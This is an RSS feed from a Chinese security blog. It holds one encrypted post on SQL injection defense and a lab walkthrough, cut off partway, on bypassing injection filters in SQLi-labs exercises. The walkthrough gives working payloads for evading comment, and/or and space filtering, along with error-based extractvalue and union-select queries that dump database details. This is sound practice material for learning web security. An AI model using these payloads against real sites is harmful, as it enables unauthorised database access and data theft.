<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>My Violet Eva Garden • Posts by &#34;sql注入探究&#34; category</title>
        <link>https://kiyomijin.github.io</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Mon, 03 Oct 2022 00:01:22 +0800</pubDate>
        <lastBuildDate>Mon, 03 Oct 2022 00:01:22 +0800</lastBuildDate>
        <category>原创</category>
        <category>XSS跨站脚本攻击探究</category>
        <category>G计划</category>
        <category>SQL注入探究</category>
        <category>数据库安全</category>
        <category>文件上传漏洞探究</category>
        <category>CTF小训</category>
        <category>Misc</category>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/03/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/</guid>
            <title>SQL注入防御</title>
            <link>https://kiyomijin.github.io/2022/10/03/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/</link>
            <category>SQL注入探究</category>
            <pubDate>Mon, 03 Oct 2022 00:01:22 +0800</pubDate>
            <description><![CDATA[ &lt;div class=&#34;hbe hbe-container&#34; id=&#34;hexo-blog-encrypt&#34; data-wpm=&#34;Oh, this is an invalid password. Check and try again, please.&#34; data-whm=&#34;OOPS, these decrypted content may changed, but you can still have a look.&#34;&gt;
  &lt;script id=&#34;hbeData&#34; type=&#34;hbeData&#34; data-hmacdigest=&#34;d8738492a3eace68e96354c22949b135ae9c2ba1fb925ed5958626ce525a8ec0&#34;&gt;881d2a9d793d5558f4c5d7fc62042411cf78789d816c07caf10e349ab53763fc5d13120843a9e21c92b2b88c68f041cce14a1640542f96b1108b53d559d0a58529fc681accd2f9c73a50648cdc0d43c51eb6cea7795993f95cac630ae2147fc035510f34e55c4077d034ad7912944b09fd6952d24abc6b21b93aa1a7a28759cac09f58bade1d4107c942c466d45b3e87ac6636ff97d567ea1420c8e65ff532ef4b5644362a165b27041829260e50a95d66ab05f71091b3f5045fd9dd8478a54ecd13548587cb02d751a99678cdb86f3a11acd48d136cc836a3cc5cd5fee9b9eb2fa7e652a9a051ffa9a9e7b2faef930359d6e16a60e93926fb723087f2d14a85375781a65eff272dd196b80797a8ff9a797675fa4b344b22591c89fc139b5a08e43370f78c72e4c90b2b3925931644511c0ad528e6f879ee94c71fe65c1a75b8aa69d37b41f6b24ad6b813de28c70ce506c3872d1fb05ba5f7c465910826ff6f6896a652d15203b97a894b90a3ec3f0141aad4f01d45f209648de9db4e7bce43d282e726140df63cb0ca03b143a0cea0a4cf32deebc608b49397c9d142aa86e88378e09500fa1bd107d2649640e9311eca4d8c59e5e26459378f0037a927da3864e08c347d619a6401ab7a4e0c106cd345c72c91b7b1b22f96077192556e30ad854fe7f1dad83efbd7bb6f27c467c18058fa329d6a76f0072745dcc86df72d956eb00a563334b18267f405d6d34dce99b8f998c4bed90161d98e9bee72cd001bc26d9926cfac99e96b9b2faa7c6db7810e46387848565e8037560981acdccd0c1d5fd3324a0d91f3450fe13c882ec85f97a1d07af6f051195efcab7e974778d84a4525ad602b4fdacb980409cf3f92f633bd2911d17c8d1af32325c5d797cf06e02b7c89fbbf298760b36e803d86139e72e1584e15697d50dc7fa132187f736e554242236b59eea2f67208eac4799a167b210a059ec2a5ec0cd48341f9a67fd5ff5ce45082d07fe309aaa4c30aabe4c6ce8ba3e6bf8ba0f239a8706a35af1ae96b87cefd28cb9bd959f232c2a94834ea98dc87d9a8117f24ce959f9cd03f074766596fc7101771d1a4b71795584ff95975432369ccd437ac85757350505c7ab7d21f21726d1fa4a79dbe3bff97c09ee1b9c53d1b8e1e2b095d28aec63aa54d041f635440e2963fbadbd824487c5c5ee9d69120a08b2a277af3832a9ca2ebd078d9b7957b250d038ba5804680c267353359f10d9055880d64c751aeaf64336c053d48b0116445377f1ccdcf3b247c09132146651338724663667b850e9e444c0d78adb311daafea4719346654c37998ff68dafd2c887754cfabeb367d38aa6ed3940b9e07d7e44634592d2c7329cddfc9eb906be5d2d139c29951b9ed2806d132298cd2eb7e5b7095bc589fbb61f85831b83f41d4d9f4005944f8c5f14cac81327f175f94326a90bf6de039d7357f0b75fddce3d0cb5ac48e30f89204f7fcb48527cd1035e6110dd9aa7de164aa965ff1ec26383f4f721e1d63131996a60a4df71297d91499da15d11415fc49e74a7382e29f46671d1c6c26f9bc4007d26ac28cfb46e442d26281ed1787167aa40556dcd0e894e7b1db9c8dbae6ce0b5d698842f73492d1fc05d2c0c1c66a43c41369624abd720fea7aedb9d7e9a9b1d9ed0f53c622a277469e1e3975c840f056b54a8e289cd245f79abba07ccfb21e2dfb0c59dc60e75efb5a8826815d464d774b967fd62aea6bfee4a9083c3165ebe3f5f828dfe0e3e5e7f20b1e02c5e1bd98529ede8b2265f5eac4e534b27371782d9cb61bbf348b2c71a70ed4d68f645dd97069191e1520bd173662510920f6cc4e30acbabf1baef636dc0b138392a463e5b5de608ddc1b8168a3120a6fc347c49e5ff39a0a17f698cf1c61221f02f947ec283d1520a3e0af894a31b661fc3ec2a2ebf57cad1bb38c67c16f86d48a8c7848cc2bf3376856e50b571bdfc4735eae8c00a5b3a88ad81bf11369caa26fe62ea23b6a4a0c948cfd5a9d0bd799279bac37f6baba94d7ed84a2fce68dea203cb7f9cb4fe7cf13927a0de0aec2168a01757704a3227c7d13e17becc121fc70d9d9d81de7a8ab45a70deb914edd67cf35b694efd4cc449ba336d767536c51aaa745d1de54cd8c699ace0052ebbf24232e6af4edb1b58dcd0d0878964e4ca90acccd8a1c14c1a3e50a09d8aeba6cc3a74abbfa78b05a0cdf3d45bc08e0e01b4672a19aa76697c1106e9e9a86025865e539fd1a2205b929f94d9900b90f661b2fcd3efbec6d47f44bf58ce2692def75493e8d8872f4d8645cd9ca9754734c0340c3a042ec6fe317c23ba3fd49e9a5f591d7f71c688af434ab47cb6db209ddbb5a72d26e699bf84599ac433e337096c36697f3ee3060516d86726aa47d69e068ac53fcaa1da48fc8aad0fa51f0dc160f48eb4cc22f06be16ed679e5a43f3655ae85ec9f4da3bbb1b9808e5bca16e0d226a0b57c0273e200b05166db2e47566f35a118bcaf68a378574c63c54cbc8ce5f26b671148d89af47bf9894f738bfe0406b299a5d523bc94ada7ccd7f56d20b819c6cd2b818f28d2e688a649d1b5e64dfc99083a9f0fda5d75c09bd8951da404e7dfc267e417b4dc826ee3b44b962d82ef3ed6ec4263afb02cb95bc91de52c33fef88ae81c644dfffaf4da7aaae40f4aa8223664bcce2b8cbd7059cb3a5f9086e9a9137bf7e56aaa03d47f8c1b3e103b7af111d0923bfd8b799c524ce624a69ed060404052623271c5bb9df5578832a6a1f17edfd78ae70007642770b9446e516f27aa2475437678742e99fe4151ba666001c90cb3f2e5ff3ea885b9c1bd1588eea926842705736cde1c529a86c3a4aaa6fd5c00adc868e7e990ab65c72ac3728eb7b5d64471b87cfc6cd372366070dcceb9fb446156e8b5786eaae529c2e5e61e962563562ad7106167aeb29bdb642bd8f70fc30cdae4e734f7e4bbc5c3470bcb815cd98fdd858cc4393799958a6e31a8bd7e54ad661c36fde832106fe2fc4a705f617c6935f8b143498788d4ea1e3d1bee8a8c35017b549f4ae9f39510c459e50bf5d5442849c694e4679288fc4fe8cd22e2d2e5818418bdfe0f5fdafd7b56c06f3fea0ea3663a4332c25c272f64ef3e77cad0b4606884fd5a54acba37eaa10bce737986f85cf69ca5ef16aae598525507320c5eb5b0c200b814c831a72c67caca7805b8028826c9dafa28736d2ac649b338e3c674645f061c7841480bdb9eff0bdf6d51203958d1b01a74b3a878dd2eb07a0d5d972c63f72712086eca0749c8904853ff10873870ea6b4e9b3c8500e9ca5eef11823bdd74b41e51b713f0b7fcbbcc5a25a81290ee842ecddaab94f041b831a9edd56928b4d3370ae60ca9f6c3f7609477700c6fd0696df0bd108fdd8a7133236e63bd3b3a54dd6f7237c332c65a69d531cf4f1454b8daafc09807658d000f70c83f6a5fe998acf89ae1d967696b77752d511f7de6666e141235e01bfddcbef0121a3587d978d34fb9151223fbdbb378537b6a0cf669a3c4ad8fee3856a0995524ce098c7dfaa5484069757a9c74a5df497794232d3ecc33b728fce8cf19ec29cdc7bebb9530c0c8a6b36e3b28ef2a97ac9efb8802869eb7d4a6257d60ded569c87b7ca14052d3967b82fa07a4a28d24e103af3ab88b08a6b59dd39651a7f8ce6efe793482b961f8be1285431c2e62d3c253815076ba73fcdd2bcef2f4825b1bf0167c56dd9e8853c1f423ff66bd2e330520f0d20f181b040b31b53904747456463c260aa99dc76ed11dfe69ac1b0a110f9f367a24c43507d81611a96e7cb59c81c2870740ba5bf5dc4d06c18dbb8b10ccb044f8e6b0e7906f8673fc5402138ed8d422db5596307b6323e15f310e61f80e46d9a5a8c9f8913af3e37557681d089e960c4a9d67aa36d816d2224464c12d9ed02f37d005f00102684691817c13ef324a504&lt;/script&gt;
  &lt;div class=&#34;hbe hbe-content&#34;&gt;
    &lt;div class=&#34;hbe hbe-input hbe-input-wave&#34;&gt;
      &lt;input class=&#34;hbe hbe-input-field hbe-input-field-wave&#34; type=&#34;password&#34; id=&#34;hbePass&#34;&gt;
      &lt;label class=&#34;hbe hbe-input-label hbe-input-label-wave&#34; for=&#34;hbePass&#34;&gt;
        &lt;span class=&#34;hbe hbe-input-label-content hbe-input-label-content-wave&#34;&gt;Hey, password is required here.&lt;/span&gt;
      &lt;/label&gt;
      &lt;svg class=&#34;hbe hbe-graphic hbe-graphic-wave&#34; width=&#34;300%&#34; height=&#34;100%&#34; viewBox=&#34;0 0 1200 60&#34; preserveAspectRatio=&#34;none&#34;&gt;
        &lt;path d=&#34;M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0&#34;&gt;&lt;/path&gt;
      &lt;/svg&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;script data-pjax src=&#34;/lib/hbe.js&#34;&gt;&lt;/script&gt;&lt;link href=&#34;/css/hbe.style.css&#34; rel=&#34;stylesheet&#34; type=&#34;text/css&#34;&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%8A%80%E5%B7%A7/</guid>
            <title>绕过注入防御技巧</title>
            <link>https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E7%BB%95%E8%BF%87%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%8A%80%E5%B7%A7/</link>
            <category>SQL注入探究</category>
            <pubDate>Sun, 02 Oct 2022 23:16:31 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;绕过各种注入防御&#34;&gt;&lt;a href=&#34;#绕过各种注入防御&#34; class=&#34;headerlink&#34; title=&#34;绕过各种注入防御&#34;&gt;&lt;/a&gt;绕过各种注入防御&lt;/h1&gt;&lt;p&gt;下面介绍几个绕过注入防御的知识：&lt;/p&gt;
&lt;h2 id=&#34;绕过注释符过滤&#34;&gt;&lt;a href=&#34;#绕过注释符过滤&#34; class=&#34;headerlink&#34; title=&#34;绕过注释符过滤&#34;&gt;&lt;/a&gt;绕过注释符过滤&lt;/h2&gt;&lt;p&gt;常见注释符有：&lt;code&gt;#&lt;/code&gt;、&lt;code&gt;%23&lt;/code&gt;、&lt;code&gt;--+&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Less-23为例&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002134327907.png&#34; alt=&#34;image-20221002134327907&#34;&gt;&lt;/p&gt;
&lt;p&gt;做以下尝试：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; %23 a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;a&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27;&amp;quot; %23 a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;syntax to use near &amp;#x27;&amp;quot; a&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据第三、第四次的结果来看&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1&amp;#39; %23 a&lt;/code&gt;  —-&amp;gt; &lt;code&gt;a&amp;#39; LIMIT 0,1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1&amp;#39;&amp;quot; %23 a&lt;/code&gt; —-&amp;gt; &lt;code&gt;&amp;quot; a&amp;#39; LIMIT 0,1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;共同的特性是&lt;strong&gt;输入的字母a保留，%23被过滤&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那&lt;code&gt;#&lt;/code&gt;和&lt;code&gt;--+&lt;/code&gt;呢？&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27;&amp;quot; # a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;quot; &amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27;&amp;quot; --+ a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;quot; a&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此，有理由怀疑——&lt;strong&gt;注释符被后台彻底过滤&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;我们来根据报错语句猜想一下后台语句：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select * from xxxx where id = &amp;#x27;1&amp;#x27; limit 0,1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;绕过方式一&#34;&gt;&lt;a href=&#34;#绕过方式一&#34; class=&#34;headerlink&#34; title=&#34;绕过方式一&#34;&gt;&lt;/a&gt;绕过方式一&lt;/h3&gt;&lt;p&gt;我们可以尝试加一个&lt;code&gt;单引号&lt;/code&gt;+&lt;code&gt;等号&lt;/code&gt;+&lt;code&gt;单引号&lt;/code&gt;：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select * from xxxx where id = &amp;#x27;1 &amp;#x27;=&amp;#x27; &amp;#x27; limit 0,1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;&amp;#39;=&amp;#39;&lt;/code&gt;即为我们的注入语句&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27;=&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Angelina&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:I-kill-you&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;成功查询，不报错。但是使用&lt;code&gt;&amp;#39;=&amp;#39;&lt;/code&gt;的话，我们没地方可插入一些想要的查询语句&lt;/p&gt;
&lt;p&gt;我们需要换一个思路&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; or 1 or &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么可以使用&lt;code&gt;布尔注入&lt;/code&gt; + &lt;code&gt;报错注入&lt;/code&gt;结合，替换两个&lt;code&gt;or&lt;/code&gt;中间的那个&lt;code&gt;1&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; or (select extractvalue(1,concat(0x7e,version(),0x7e))) or &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002140115121.png&#34; alt=&#34;image-20221002140115121&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来就可以愉快地爆出数据库名、表、列、值等信息。&lt;/p&gt;
&lt;p&gt;以爆出列名为例：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; or (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))) or &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002140341257.png&#34; alt=&#34;image-20221002140341257&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;绕过方式二&#34;&gt;&lt;a href=&#34;#绕过方式二&#34; class=&#34;headerlink&#34; title=&#34;绕过方式二&#34;&gt;&lt;/a&gt;绕过方式二&lt;/h3&gt;&lt;p&gt;其实，我们也可以通过闭合前后的单引号，中间使用union来做操作&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：后面单引号引领着一个列，所以union select的包含的列需要把后面的单引号内容考虑进来&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#两个列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; union select 1, &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，The used SELECT statements have a different number of columns&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#三个列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-23/?id=1&amp;#x27; union select 1,2,&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;绕过and-or强过滤&#34;&gt;&lt;a href=&#34;#绕过and-or强过滤&#34; class=&#34;headerlink&#34; title=&#34;绕过and/or强过滤&#34;&gt;&lt;/a&gt;绕过and/or强过滤&lt;/h2&gt;&lt;p&gt;将and/or 及其大小写，混合大小写（Or、oR等）均替换成空&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-25/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-25/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-25/?id=1&amp;#x27; order by 2 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;der by 2 #&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-25/?id=1&amp;#x27; aa order by 2 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;aa der by 2 #&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以发现or被强制过滤，即任何出现or的地方被强制替换成空&lt;/p&gt;
&lt;h3 id=&#34;绕过方式&#34;&gt;&lt;a href=&#34;#绕过方式&#34; class=&#34;headerlink&#34; title=&#34;绕过方式&#34;&gt;&lt;/a&gt;绕过方式&lt;/h3&gt;&lt;p&gt;使用&lt;code&gt;||&lt;/code&gt;、&lt;code&gt;oorr&lt;/code&gt;来替代or，再使用布尔替换+报错注入构造查询：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-25/?id=-1&amp;#x27; || (select extractvalue(1,concat(0x7e,version(),0x7e))) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-25/?id=1&amp;#x27; oorr (select extractvalue(1,concat(0x7e,version(),0x7e))) %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002142717645.png&#34; alt=&#34;image-20221002142717645&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;绕过空格字符&#34;&gt;&lt;a href=&#34;#绕过空格字符&#34; class=&#34;headerlink&#34; title=&#34;绕过空格字符&#34;&gt;&lt;/a&gt;绕过空格字符&lt;/h2&gt;&lt;p&gt;Less-26为例：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-26/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-26/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;报错，syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-26/?id=1&amp;#x27; or 1 or &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;错，syntax to use near &amp;#x27;&amp;#x27;1&amp;#x27;&amp;#x27; LIMIT 0,1&amp;#x27; at line 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-26/?id=1&amp;#x27; || 1 || &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Login name:Dumb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Your Password:Dumb&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由此，可以构造：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-26/?id=1&amp;#x27; || (select extractvalue(1,concat(0x7e,version(),0x7e))) || &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002143828165.png&#34; alt=&#34;image-20221002143828165&#34;&gt;&lt;/p&gt;
&lt;p&gt;空格被过滤&lt;/p&gt;
&lt;h3 id=&#34;绕过方式-1&#34;&gt;&lt;a href=&#34;#绕过方式-1&#34; class=&#34;headerlink&#34; title=&#34;绕过方式&#34;&gt;&lt;/a&gt;绕过方式&lt;/h3&gt;&lt;p&gt;常见的空格替换方式有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;%09&lt;/code&gt; TAB键(水平)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%0a&lt;/code&gt; 新建一行&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%0c&lt;/code&gt; 新的一页&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%0d&lt;/code&gt; return 功能&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%0b&lt;/code&gt; TAB键(垂直)&lt;/li&gt;
